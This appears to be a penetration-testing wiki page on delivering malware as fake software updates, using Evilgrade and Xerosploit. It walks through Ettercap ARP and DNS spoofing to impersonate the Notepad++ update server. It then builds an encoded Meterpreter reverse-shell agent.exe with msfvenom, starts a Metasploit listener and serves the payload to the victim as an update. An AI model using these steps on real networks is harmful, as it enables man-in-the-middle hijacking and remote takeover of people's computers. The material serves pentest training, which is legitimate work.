# Malicious Update

#### Presenting the victim with a malicious payload as a software update package.

## IRS-Evilgrade

{% embed url="https://github.com/infobyte/evilgrade" %}

Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates. It comes with pre-made binaries (agents), a working default configuration for fast pentests, and has it's own WebServer and DNSServer modules. Easy to set up new settings, and has an autoconfiguration when new binary agents are set.

#### This framework comes into play when the attacker is able to make hostname redirections (manipulation of victim's dns traffic), and such thing can be done on 2 scenarios:

**Internal scenery:**

* Internal DNS access
* ARP spoofing
* DNS Cache Poisoning
* DHCP spoofing
* TCP hijacking
* Wi-Fi Access Point impersonation

**External scenery:**

* Internal DNS access
* DNS Cache Poisoning

#### installation

```
apt install irs-evilgrade
evilgrade
```

#### start/stop web and DNS server

```
evilgrade> start
evilgrade> stop
```

#### list available modules

```
evilgrade>show modules
```

#### Configure a specified module

```
evilgrade>conf sunjava
evilgrade(sunjava)>
```

#### Show all VirtualHosts.&#x20;

VirtualHost field contains the domains that our webserver is going to emulate for us.

```
evilgrade>show vhosts
```

#### Show options of current module.&#x20;

**agent:** This is our fake update binary, we have to set the path to where it's located or implement a dynamic fake update binary generation (see ADVANCED).

```
evilgrade(sunjava)>show options
```

#### Show status and victims logs

```
evilgrade>show status
```

### Exploitation

we'll look at manipulating the update process of the popular text editor Notepad++. First, we'll use Ettercap to create a MitM attack position and impersonate the notepad-plus.sourceforge.net server used to check for update availability and to deliver the updated software.

Ettercap includes support for manipulating DNS responses, spoofing the DNS response for any hostname you specify in the etter.dns file. On the top of this slide we append to the etter.dns file an A record for "notepad- plus.sourceforge.net," pointing to the attacker at 10.10.10.10

```
echo "notepad-plus.sourceforge.net" A 10.10.10.10" >> /etc/ettercap/etter.dns
```

Next we invoke Ettercap using ARP spoofing to create a MitM attack using the arguments we examined earlier. After Ettercap starts, press "p" to list the available plugins (the list shown on this slide has been trimmed for space). To load the dns\_spoof plugin, which will leverage the etter.dns file to obtain the list of hosts to impersonate, enter the plugin name "dns\_spoof" and press Enter.

```
sudo ettercap -YqM arp:remote /10.10.10.1-254// /10.10.10.1-254//
```

Evilgrade delivers malicious code with local web server

{% hint style="info" %}
Default is agent.exe in isr-evilgrade/agent directory.&#x20;

Replace this file (Notepad clone) or change the "agent" parameter in the module.
{% endhint %}

```
cd /usr/share/irs-evilgrade/agent
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=8080 -f exe --platform windows -e x86/shikata_ga_nai -a x86 > agent.exe
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.56.1; set lport 8080;exploit"
```

The LHOST argument used by the attacker can be set to a specific IP address to launch the listener on a specific interface, or it can be set to 0.0.0.0 to listen and accept connections on all interfaces. In this example, we take advantage of the msfconsole "-x" argument, which allows us to specify all the arguments on the command line, separated by semicolons. Be sure to include quotes around these arguments, as shown in the example on this page, to prevent the shell from interpreting the semicolons as additional shell commands.

#### run evilgrade and configure notepadplus module:

```
evilgrade
evilgrade> conf notepadplus
evilgrade(notepadplus)>show options

```

![](<../../.gitbook/assets/image (296) (1) (1) (1).png>)

```
evilgrade(notepadplus)>start
```

we invoke the "evilgrade" executable to invoke the handler for the Notepad++ software update process. At the "evilgrade>" prompt, enter "conf notepadplus" to invoke the Notepad++ handler. For any Evilgrade module, running "show options" will display configuration information and options that can be manipulated using the "set" command, such as the filename to an alternative executable to deliver to the attacker. Finally, launch the module by issuing the "start" command, which will invoke the Evilgrade web server.

![](<../../.gitbook/assets/image (276) (1).png>)

Evilgrade will log to standard output the status of client requests for updates, as shown on this slide. The first log entry indicates that the Notepad++ client requested the getDownLoadUrl.php page, which checks for an available update. The second entry indicates the client's request for the executable file to download and install, followed by the delivery of the agent/agent.exe file to the victim.

{% hint style="info" %}
Evilgrade-like techniques are still possible, but the proliferation of HTTPS makes upgrade attacks a little more difficult. If a pen tester notices a MitM situation is possible during an update, they are more likely to create a custom script that performs the replacement, rather than use a framework.
{% endhint %}

### Demo

{% embed url="https://www.youtube.com/watch?ab_channel=Unownsec&v=nReKwL93Fnk" %}

## Xerosploit

{% embed url="https://github.com/LionSec/xerosploit" %}

Xerosploit is a penetration testing toolkit whose goal is to perform man in the middle attacks for testing purposes. It brings various modules that allow to realise efficient attacks, and also allows to carry out denial of service attacks and port scanning.

### features:

* Port scanning
* Network mapping
* Dos attack
* Html code injection
* Javascript code injection
* Download intercaption and replacement
* Sniffing
* Dns spoofing
* Background audio reproduction
* Images replacement
* Drifnet
* Webpage defacement and more ...

#### installation

```
git clone https://github.com/LionSec/xerosploit
cd xerosploit && sudo python install.py
sudo xerosploit
```

### Demo

{% embed url="https://www.youtube.com/watch?ab_channel=Neodrix&v=35QUrtZEV9U" %}

## Combine with BeFF and Metasploit

{% embed url="https://sploitech.com/exploiting-tools/how-to-do-advanced-mitm-attacks-with-beef-xerosploit" %}

